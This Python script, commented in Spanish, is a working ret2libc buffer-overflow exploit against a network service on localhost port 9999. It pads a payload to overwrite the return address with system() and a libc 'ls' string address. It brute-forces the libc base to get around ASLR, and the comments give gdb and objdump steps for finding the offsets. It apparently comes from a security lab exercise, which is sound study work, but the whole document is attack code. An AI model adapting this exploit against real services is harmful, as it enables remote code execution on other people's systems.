#!/usr/bin/env python3
import struct
import socket
 
SRV_PORT = 9999
SRV_IP = "127.0.0.1"

padding = 76  # Ajusta este valor según tu análisis con GDB

# offset de system() en la libc (objdump -T /lib32/libc.so.6 | grep system)
system_offset = 0x52220

# offset de exit() en la libc (objdump -T /lib32/libc.so.6 | grep exit)
exit_offset = 0x3ead0

# offset de "ls" en la libc -> addr "ls" - (addr system - system_offset)
# (gdb) p system -> addr system
# (gdb) find 0xf7d7c000, 0xf7f9a000, "ls" ->  addr "ls"
ls_offset = 0x17d37

# Variables de iteracion de fuerza bruta para ASLR activado
initial_addr = 0xf7c00000
final_addr = 0xf7dff000

'''
# Variables para ASLR desactivado
leak_libc = 0xf7d68000
initial_addr = leak_libc - 0x1000
final_addr = leak_libc + 0x1000
'''

step = 0x1000

# Addr sin ASLR : system_addr = 0xf7db84c0 
# Payload sin ASLR: \xc0\x84\xdb\xf7JUNK\xef\xdc\xd7\xf7
 
def create_payload(libc_base):	
	payload  = b"A" * padding
	payload += struct.pack("<I", libc_base + system_offset)  # Dirección de system()
	payload += b"JUNK" 
	# payload += struct.pack("<I", libc_base + exit_offset) 
	payload += struct.pack("<I", libc_base + ls_offset)   # Dirección del argumento ("ls")
	return payload

intento=1

for libc_base in range(initial_addr, final_addr, step): 

	payload = create_payload(libc_base);
	
	try:
	    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	    s.connect((SRV_IP, SRV_PORT))
	    s.send(payload)
	    s.close()
	    print(f"[*] Intento #{intento} - Enviando payload con libc {hex(libc_base)}")
	    intento += 1    
	except Exception as e:
	    print(f"[!] Error al conectar con el servidor: {e}")
	    break
	

print(f"Exploit finish")
